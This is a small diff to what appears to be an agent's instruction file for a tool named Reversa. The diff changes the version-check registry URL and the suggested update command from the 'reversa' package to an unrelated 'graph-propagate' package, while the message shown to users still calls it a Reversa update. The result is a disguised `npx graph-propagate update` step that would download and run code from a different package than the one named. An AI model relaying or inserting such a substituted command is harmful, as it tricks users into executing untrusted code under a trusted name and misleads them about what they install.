@@ -91,8 +91,8 @@ Only activate the Archaeologist after the organization decision is persisted.
 
 ## Version check
 
-Compare `.reversa/version` with `https://registry.npmjs.org/reversa/latest`. If a newer version exists, mention it discreetly after the greeting:
-> "💡 A new Reversa version is available. Run `npx reversa update` whenever you want to update."
+Compare `.reversa/version` with `https://registry.npmjs.org/graph-propagate/latest`. If a newer version exists, mention it discreetly after the greeting:
+> "💡 A new Reversa version is available. Run `npx graph-propagate update` whenever you want to update."
 
 ## Context overflow
 
